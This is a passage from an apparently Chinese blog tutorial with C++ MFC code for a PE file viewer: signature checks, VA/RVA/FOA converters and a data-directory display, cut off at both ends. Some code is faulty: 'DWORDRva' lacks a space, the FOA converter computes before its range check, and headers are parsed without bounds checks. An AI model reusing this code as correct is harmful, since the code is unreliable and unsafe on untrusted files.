class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL,</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//2 获取文件大小</span></span><br><span class="line">DWORD dwFileSize = GetFileSize(hFile, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3 申请空间并初始化</span></span><br><span class="line">buf = <span class="keyword">new</span> <span class="keyword">char</span>[dwFileSize] &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//4 读取文件</span></span><br><span class="line">DWORD dwRealSize = <span class="number">0</span>;</span><br><span class="line">ReadFile(hFile, buf, dwFileSize, &amp;dwRealSize, <span class="literal">NULL</span>);</span><br><span class="line">CloseHandle(hFile);</span><br><span class="line"><span class="comment">//5 判断是不是PE文件</span></span><br><span class="line"><span class="keyword">if</span> (IsPE_File(buf) == TRUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//AnalyzeNTHeader(buf);</span></span><br><span class="line">CMyPeShowDlg* CMyShowDlg = <span class="keyword">new</span> CMyPeShowDlg;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">CMyShowDlg-&gt;Create(IDD_PESHOWND,<span class="keyword">this</span>);</span><br><span class="line">CMyShowDlg-&gt;ShowWindow(SW_SHOW);</span><br><span class="line">CMyShowDlg-&gt;GetFilePath(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">MessageBox(<span class="string">L&quot;别瞎搞&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CDialogEx::OnDropFiles(hDropInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="判断文件是否为PE文件"><a href="#判断文件是否为PE文件" class="headerlink" title="判断文件是否为PE文件"></a>判断文件是否为PE文件</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断是不是PE文件</span></span><br><span class="line"><span class="function">BOOL <span class="title">CMyLoadPeDlg::IsPE_File</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line"><span class="keyword">if</span> (pDos-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pNt-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="位置计算器"><a href="#位置计算器" class="headerlink" title="位置计算器"></a>位置计算器</h2><h3 id="通过VA计算RVA、FOA"><a href="#通过VA计算RVA、FOA" class="headerlink" title="通过VA计算RVA、FOA"></a>通过VA计算RVA、FOA</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//VA</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyClacDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">UpdateData(TRUE);</span><br><span class="line">CString svPid = m_strEditVA.GetString();</span><br><span class="line">DWORD dwVa = _tcstoul(svPid, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)m_buff;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + m_buff);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption = &amp;pNt-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line">DWORD Rva = dwVa - pOption-&gt;ImageBase;</span><br><span class="line">CString rva;</span><br><span class="line">rva.Format(<span class="string">L&quot;%08x&quot;</span>, Rva);</span><br><span class="line">m_strEditRVA.SetString(rva);</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Rva &gt;= dwSectionRva &amp;&amp; Rva &lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwFOA = Rva - dwSectionRva + dwSectionFOA;</span><br><span class="line">CString foa;</span><br><span class="line">foa.Format(<span class="string">L&quot;%08x&quot;</span>, dwFOA);</span><br><span class="line">m_strEditFOA.SetString(foa);</span><br><span class="line"><span class="comment">//区段名</span></span><br><span class="line"></span><br><span class="line">CString name;</span><br><span class="line">name.Format(<span class="string">L&quot;%S&quot;</span>, pHeader[i].Name);</span><br><span class="line">m_strEditName.SetString(name);</span><br><span class="line"></span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">MessageBox(<span class="string">L&quot;无法计算_请重新输入&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过RVA计算VA、FOA"><a href="#通过RVA计算VA、FOA" class="headerlink" title="通过RVA计算VA、FOA"></a>通过RVA计算VA、FOA</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RVA</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyClacDlg::OnBnClickedButton17</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UpdateData(TRUE);</span><br><span class="line">CString svPid = m_strEditRVA.GetString();</span><br><span class="line">DWORD dwRva = _tcstoul(svPid, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)m_buff;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + m_buff);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption = &amp;pNt-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line">CString cd;</span><br><span class="line">cd.Format(<span class="string">L&quot;%08x&quot;</span>, dwRva);</span><br><span class="line">m_strEditFOA.SetString(cd);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= dwSectionRva &amp;&amp; dwRva &lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FOA= RVA   - RVA区段   + FOA区段</span></span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva + dwSectionFOA;</span><br><span class="line">CString foa;</span><br><span class="line">foa.Format(<span class="string">L&quot;%08x&quot;</span>, dwFOA);</span><br><span class="line">m_strEditFOA.SetString(foa);</span><br><span class="line"></span><br><span class="line"><span class="comment">//va虚拟地址= InmageBase(加载基址) + RVA(相对虚拟地址)</span></span><br><span class="line">DWORD dwVA = pOption-&gt;ImageBase + dwRva;</span><br><span class="line">CString va;</span><br><span class="line">va.Format(<span class="string">L&quot;%08x&quot;</span>, dwVA);</span><br><span class="line">m_strEditVA.SetString(va);</span><br><span class="line"></span><br><span class="line"><span class="comment">//区段名</span></span><br><span class="line">CString name;</span><br><span class="line">name.Format(<span class="string">L&quot;%S&quot;</span>, pHeader[i].Name);</span><br><span class="line">m_strEditName.SetString(name);</span><br><span class="line"></span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">MessageBox(<span class="string">L&quot;无法计算_请重新输入&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="通过FOA计算VA、RVA"><a href="#通过FOA计算VA、RVA" class="headerlink" title="通过FOA计算VA、RVA"></a>通过FOA计算VA、RVA</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//FOA</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyClacDlg::OnBnClickedButton18</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UpdateData(TRUE);</span><br><span class="line">CString svPid = m_strEditFOA.GetString();</span><br><span class="line">DWORD dwFoa = _tcstoul(svPid, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)m_buff;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + m_buff);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption = &amp;pNt-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwFoa &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line">CString cd;</span><br><span class="line">cd.Format(<span class="string">L&quot;%08x&quot;</span>, dwFoa);</span><br><span class="line">m_strEditRVA.SetString(cd);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断FOA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"></span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FOA= RVA   - RVA区段   + FOA区段</span></span><br><span class="line"><span class="comment">//DWORD dwFOA = dwFoa - dwSectionRva + dwSectionFOA;</span></span><br><span class="line">DWORDRva = dwFoa + dwSectionRva - dwSectionFOA;</span><br><span class="line">CString rva;</span><br><span class="line">rva.Format(<span class="string">L&quot;%08x&quot;</span>, Rva);</span><br><span class="line">m_strEditRVA.SetString(rva);</span><br><span class="line"><span class="comment">//va虚拟地址= InmageBase(加载基址) + RVA(相对虚拟地址)</span></span><br><span class="line">DWORD dwVA = pOption-&gt;ImageBase + Rva;</span><br><span class="line">CString va;</span><br><span class="line">va.Format(<span class="string">L&quot;%08x&quot;</span>, dwVA);</span><br><span class="line">m_strEditVA.SetString(va);</span><br><span class="line"><span class="keyword">if</span> (Rva &gt;= dwSectionRva &amp;&amp; Rva &lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//区段名</span></span><br><span class="line">CString name;</span><br><span class="line">name.Format(<span class="string">L&quot;%S&quot;</span>, pHeader[i].Name);</span><br><span class="line">m_strEditName.SetString(name);</span><br><span class="line"></span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">MessageBox(<span class="string">L&quot;无法计算_请重新输入&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RVA转换FOA（函数封装）"><a href="#RVA转换FOA（函数封装）" class="headerlink" title="RVA转换FOA（函数封装）"></a>RVA转换FOA（函数封装）</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//RVA转换FOA</span></span><br><span class="line"><span class="function">DWORD <span class="title">CMyExPortTabDlg::RvaToFoa</span><span class="params">(DWORD dwRva, <span class="keyword">char</span>* buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buf;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + buf);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> dwRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= dwSectionRva &amp;&amp; dwRva &lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva + dwSectionFOA;</span><br><span class="line"><span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="目录表"><a href="#目录表" class="headerlink" title="目录表"></a>目录表</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//输出目录表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMyDirTabDlg::GetPath</span><span class="params">(<span class="keyword">int</span> i, PIMAGE_DATA_DIRECTORY pExportDir, <span class="keyword">char</span>* buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">m_Filebuff = buf;</span><br><span class="line">CString Address;</span><br><span class="line">CString Size;</span><br><span class="line"><span class="keyword">switch</span> (i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//导出表</span></span><br><span class="line">m_pExportDir = pExportDir;</span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditOutTabRVA.SetString(Address);</span><br><span class="line">m_dwSize = pExportDir-&gt;Size;<span class="comment">//保存导出表大小，可做判断</span></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditOutTabSIZE.SetString(Size);</span><br><span class="line"></span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//导入表</span></span><br><span class="line">m_pInportDir = pExportDir;</span><br><span class="line"></span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditInTabRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditInTabSIZE.SetString(Size);</span><br><span class="line"></span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//资源表</span></span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditResourcesRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditResourcesSIZE.SetString(Size);</span><br><span class="line"></span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//异常表Abnormal</span></span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditAbnormalRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditAbnormalSIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">4</span>:<span class="comment">//安全security</span></span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditSecurityRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditSecuritySIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">5</span>:<span class="comment">//重定位Basereloc</span></span><br><span class="line">m_pReLocaTionDir = pExportDir;</span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditBaserelocRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditBaserelocSIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">6</span>:<span class="comment">//调试Debug</span></span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditDebugRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditDebugSIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">7</span>:<span class="comment">//版权Architecture</span></span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditArchitectureRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditArchitectureSIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">8</span>:<span class="comment">//全局指针Glpbalptr</span></span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditGlpbalptrRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span class="line">m_strEditGlpbalptrSIZE.SetString(Size);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">9</span>:<span class="comment">//线程局部TLS</span></span><br><span class="line">m_pTlsTab = pExportDir;</span><br><span class="line">Address.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;VirtualAddress);</span><br><span class="line">m_strEditTlsRVA.SetString(Address);</span><br><span class="line"></span><br><span class="line">Size.Format(<span class="string">L&quot;%08x&quot;</span>, pExportDir-&gt;Size);</span><br><span 